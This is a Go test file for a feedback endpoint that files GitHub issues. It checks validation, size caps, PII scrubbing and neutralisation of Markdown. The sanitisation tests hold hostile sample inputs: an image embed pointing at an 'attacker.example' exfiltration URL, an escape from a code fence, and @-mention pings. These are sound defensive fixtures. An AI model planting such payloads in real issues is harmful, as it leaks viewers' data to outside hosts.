package feedback

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/markdrogersjr/Concord/services/control-plane/pkg/logger"
)

// fakeGitHub captures CreateIssue calls so handler tests can assert what
// would have been sent to GitHub without making any network call.
type fakeGitHub struct {
	calls       []IssueRequest
	returnIssue *IssueResponse
	returnErr   error
}

func (f *fakeGitHub) CreateIssue(_ context.Context, req IssueRequest) (*IssueResponse, error) {
	f.calls = append(f.calls, req)
	if f.returnErr != nil {
		return nil, f.returnErr
	}
	if f.returnIssue != nil {
		return f.returnIssue, nil
	}
	return &IssueResponse{Number: 1, HTMLURL: "https://github.com/test/repo/issues/1"}, nil
}

// newTestEngine wires the handler into a Gin engine with the auth
// middleware emulated by setting `user_id` on the context. Returns a func
// the caller invokes to perform the POST request.
func newTestEngine(t *testing.T, h *Handler, userID string) *gin.Engine {
	t.Helper()
	gin.SetMode(gin.TestMode)
	r := gin.New()
	r.POST("/api/v1/feedback", func(c *gin.Context) {
		if userID != "" {
			c.Set("user_id", userID)
		}
		h.Submit(c)
	})
	return r
}

func doPost(t *testing.T, r *gin.Engine, payload interface{}) *httptest.ResponseRecorder {
	t.Helper()
	body, err := json.Marshal(payload)
	require.NoError(t, err)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/feedback", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

func newTestHandler(github GitHubIssueCreator) *Handler {
	return NewHandler(logger.New("test"), github)
}

// ─── Auth ─────────────────────────────────────────────────────────────────

func TestSubmit_RequiresUserID(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "") // no user_id on context

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "Crash",
		"description": "Repro: ...",
	})
	assert.Equal(t, http.StatusUnauthorized, w.Code)
}

// ─── Validation ───────────────────────────────────────────────────────────

func TestSubmit_RejectsInvalidType(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "spam",
		"title":       "Hi",
		"description": "Hello",
	})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "invalid report type")
}

func TestSubmit_RejectsEmptyTitle(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "   ",
		"description": "Hello",
	})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "title is required")
}

func TestSubmit_RejectsEmptyDescription(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "Crash",
		"description": "  ",
	})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "description is required")
}

func TestSubmit_RejectsOversizeTitle(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       strings.Repeat("a", maxTitleBytes+1),
		"description": "Repro: ...",
	})
	assert.Equal(t, http.StatusBadRequest, w.Code)
}

// ─── Sanitization ─────────────────────────────────────────────────────────

// PII in title/description must be scrubbed before being sent to GitHub.
func TestSubmit_SanitizesUserSuppliedFields(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "Email leak from alice@example.com",
		"description": "Tried to /Users/alice/Documents/foo.txt and got refused by 10.0.0.5",
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	assert.NotContains(t, gh.calls[0].Title, "alice@example.com")
	assert.Contains(t, gh.calls[0].Title, "<email>")
	assert.NotContains(t, gh.calls[0].Body, "/Users/alice")
	assert.NotContains(t, gh.calls[0].Body, "10.0.0.5")
}

// ─── Issue assembly ───────────────────────────────────────────────────────

func TestSubmit_BugReport_AssemblesIssueShape(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-42")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "Crash on send",
		"description": "Steps to reproduce: 1...",
		"diagnostics": map[string]interface{}{
			"appVersion":      "0.1.60",
			"platform":        "darwin",
			"machineIdPrefix": "4c33734c",
			"connectionPhase": "stable",
			"gpu":             map[string]string{"vendor": "Apple", "renderer": "M1 Pro"},
			"display":         map[string]interface{}{"width": 3024, "height": 1964, "scaleFactor": 2},
			"logs":            "2026-06-12T00:00:00Z  [warn]  network hiccup",
		},
	})

	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	call := gh.calls[0]
	assert.Equal(t, "[Bug Report] Crash on send", call.Title)
	assert.Equal(t, []string{"type: bug"}, call.Labels)
	assert.Contains(t, call.Body, "user `user-42`")
	assert.Contains(t, call.Body, "**App Version:** 0.1.60")
	assert.Contains(t, call.Body, "**Platform:** darwin")
	assert.Contains(t, call.Body, "## Description")
	assert.Contains(t, call.Body, "Steps to reproduce")
	assert.Contains(t, call.Body, "## Diagnostics")
	assert.Contains(t, call.Body, "Apple / M1 Pro")
	assert.Contains(t, call.Body, "3024x1964")
	assert.Contains(t, call.Body, "Recent logs (sanitized)")
}

func TestSubmit_FeatureRequest_AssemblesIssueShape(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-9")

	w := doPost(t, r, map[string]interface{}{
		"type":        "feature",
		"title":       "Add dark high-contrast preset",
		"description": "Would help low-vision users.",
		"category":    "Improvement to Existing Feature",
	})

	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	call := gh.calls[0]
	assert.Equal(t, "[Feature Request] Add dark high-contrast preset", call.Title)
	assert.Equal(t, []string{"type: feature"}, call.Labels)
	assert.Contains(t, call.Body, "user `user-9`")
	assert.Contains(t, call.Body, "**Category:** Improvement to Existing Feature")
	assert.NotContains(t, call.Body, "## Diagnostics", "feature requests must not emit diagnostics section")
}

// ─── Response ─────────────────────────────────────────────────────────────

func TestSubmit_SuccessReturnsIssueURL(t *testing.T) {
	gh := &fakeGitHub{
		returnIssue: &IssueResponse{Number: 7, HTMLURL: "https://github.com/x/y/issues/7"},
	}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "feature",
		"title":       "X",
		"description": "Y",
	})
	require.Equal(t, http.StatusOK, w.Code)

	var resp submitResponse
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
	assert.Equal(t, "https://github.com/x/y/issues/7", resp.IssueURL)
	assert.False(t, resp.Dev)
}

func TestSubmit_DevStubReturnsDevTrue(t *testing.T) {
	// Nil github client → handler.github == nil → log-only stub.
	h := newTestHandler(nil)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "X",
		"description": "Y",
	})
	require.Equal(t, http.StatusOK, w.Code)

	var resp submitResponse
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
	assert.True(t, resp.Dev)
	assert.Empty(t, resp.IssueURL)
}

func TestSubmit_GitHubErrorReturns502(t *testing.T) {
	gh := &fakeGitHub{returnErr: assertGitHubError("validation failed")}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "X",
		"description": "Y",
	})
	assert.Equal(t, http.StatusBadGateway, w.Code)
}

// ─── PR #1547 review fixes ────────────────────────────────────────────────

// Category is bounded — Gitar / @security-reviewer finding on the
// originally-unbounded field. (Title/Description had existing caps.)
func TestSubmit_RejectsOversizeCategory(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "feature",
		"title":       "X",
		"description": "Y",
		"category":    strings.Repeat("a", maxCategoryBytes+1),
	})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "category exceeds")
}

// Defense-in-depth sanitization on ALL free-text diagnostics fields
// (Gitar finding: previously only Logs was sanitized server-side).
func TestSubmit_SanitizesAllDiagnosticsFields(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-42")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "X",
		"description": "Y",
		"diagnostics": map[string]interface{}{
			"appVersion":      "v1.0 leaked alice@example.com",
			"platform":        "darwin path /Users/alice/bin",
			"machineIdPrefix": "ip 192.168.1.5",
			"connectionPhase": "stable from 2001:db8:abcd:1234:5678:9abc:def0:1",
			"gpu":             map[string]string{"vendor": "vendor@evil.com", "renderer": "M1 /Users/bob/gpu"},
			"logs":            "ok",
		},
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	body := gh.calls[0].Body
	assert.NotContains(t, body, "alice@example.com")
	assert.NotContains(t, body, "vendor@evil.com")
	assert.NotContains(t, body, "/Users/alice")
	assert.NotContains(t, body, "/Users/bob")
	assert.NotContains(t, body, "192.168.1.5")
	// IPv6 full-form is also matched by the IP pattern.
	assert.NotContains(t, body, "2001:db8:abcd")
}

// Markdown @-mentions, image embeds, and #-issue-refs are neutralized so
// a hostile client cannot ping arbitrary GitHub users / exfil triagers'
// browsing data via image embeds. ZWSP (U+200B) is invisible in the
// rendered issue but breaks the autolink trigger.
func TestSubmit_NeutralizesMarkdownAutolinks(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "Ping @Concord-Voice/security please",
		"description": "Refs #1547 and exfil ![pwn](https://attacker.example/?u=1)",
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)

	// Title: the bare "@Concord" must NOT appear without the ZWSP. The
	// rendered token is "@\u200bConcord-Voice/security" — looks identical
	// to a triager but won't autolink. We assert by checking the ZWSP is
	// present immediately after `@`.
	assert.Contains(t, gh.calls[0].Title, "@\u200bConcord-Voice/security")
	// Description: `#1547` becomes `#\u200b1547`, and `![pwn]` becomes
	// `!\u200b[pwn]` (the `!` is preserved but the image syntax broken).
	assert.Contains(t, gh.calls[0].Body, "#\u200b1547")
	assert.Contains(t, gh.calls[0].Body, "!\u200b[pwn](https://attacker.example/?u=1)")
}

// Markdown autolink neutralization also applies to free-text diagnostics
// fields (a compromised client could place autolink payloads in e.g. the
// GPU vendor string to bypass title/description neutralization).
func TestSubmit_NeutralizesMarkdownInDiagnostics(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "T",
		"description": "D",
		"diagnostics": map[string]interface{}{
			"appVersion":      "v1.0",
			"platform":        "darwin",
			"machineIdPrefix": "4c33734c",
			"connectionPhase": "stable",
			"gpu":             map[string]string{"vendor": "@evil-team payload", "renderer": "M1"},
			"logs":            "",
		},
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	assert.Contains(t, gh.calls[0].Body, "@\u200bevil-team")
}

// User-supplied logs containing backtick runs cannot escape the fenced
// code block — writeDiagnostics picks a fence whose length exceeds the
// longest backtick run in the content.
func TestSubmit_LogsCannotEscapeCodeFence(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	// Logs contain a closing 3-backtick sequence followed by an injection
	// attempt. The handler must pick a 4+-backtick fence so the injection
	// stays inside the code block.
	logs := "log line 1\n```\n@evil-injection\n```\nlog line 2"

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       "X",
		"description": "Y",
		"diagnostics": map[string]interface{}{
			"appVersion":      "v",
			"platform":        "p",
			"machineIdPrefix": "m",
			"connectionPhase": "s",
			"logs":            logs,
		},
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	body := gh.calls[0].Body

	// The body must use a 4-backtick fence around the logs (3 in content + 1).
	assert.Contains(t, body, "\n````\n")
	// The 3-backtick run inside the logs is preserved verbatim — it does
	// NOT close the surrounding 4-backtick fence.
	assert.Contains(t, body, "```")
}

// 413 response when the request body exceeds MaxRequestBytes — distinct
// from the 400 "invalid request body" used for malformed JSON.
func TestSubmit_OversizeBodyReturns413(t *testing.T) {
	h := newTestHandler(&fakeGitHub{})
	r := newTestEngine(t, h, "user-1")

	// Build a JSON-valid body larger than MaxRequestBytes (128 KB) by
	// putting a long string into `description` — the JSON parser reads
	// the whole body before deciding it's malformed, so MaxBytesReader
	// trips first.
	body := strings.Builder{}
	body.WriteString(`{"type":"bug","title":"X","description":"`)
	body.WriteString(strings.Repeat("a", MaxRequestBytes+100))
	body.WriteString(`"}`)

	req := httptest.NewRequest(http.MethodPost, "/api/v1/feedback", strings.NewReader(body.String()))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	assert.Equal(t, http.StatusRequestEntityTooLarge, w.Code)
	assert.Contains(t, w.Body.String(), "request body too large")
}

// The assembled GitHub issue body must stay under maxBodyBytes even when
// every per-field cap is saturated — GitHub rejects bodies > 65,536 chars.
// Verifies the lower maxLogsBytes (40_000) + per-field caps mathematically
// keep the body under GitHub's limit.
func TestSubmit_AssembledBodyStaysUnderGitHubLimit(t *testing.T) {
	gh := &fakeGitHub{}
	h := newTestHandler(gh)
	r := newTestEngine(t, h, "user-1")

	w := doPost(t, r, map[string]interface{}{
		"type":        "bug",
		"title":       strings.Repeat("a", maxTitleBytes),
		"description": strings.Repeat("b", maxDescriptionBytes),
		"diagnostics": map[string]interface{}{
			"appVersion":      "v0.1.60",
			"platform":        "darwin",
			"machineIdPrefix": "4c33734c",
			"connectionPhase": "stable",
			"gpu":             map[string]string{"vendor": "Apple", "renderer": "M1 Pro"},
			"display":         map[string]interface{}{"width": 3024, "height": 1964, "scaleFactor": 2},
			"logs":            strings.Repeat("c", maxLogsBytes),
		},
	})
	require.Equal(t, http.StatusOK, w.Code)
	require.Len(t, gh.calls, 1)
	// GitHub's REST API caps issue bodies at 65,536 chars; maxBodyBytes
	// is 60,000 — assembled body must stay under maxBodyBytes too.
	assert.LessOrEqual(t, len(gh.calls[0].Body), maxBodyBytes,
		"assembled body %d bytes exceeds maxBodyBytes %d — would be rejected by GitHub",
		len(gh.calls[0].Body), maxBodyBytes)
}

// ─── helpers ──────────────────────────────────────────────────────────────

type fakeError string

func (e fakeError) Error() string { return string(e) }

func assertGitHubError(msg string) error { return fakeError("github: " + msg) }
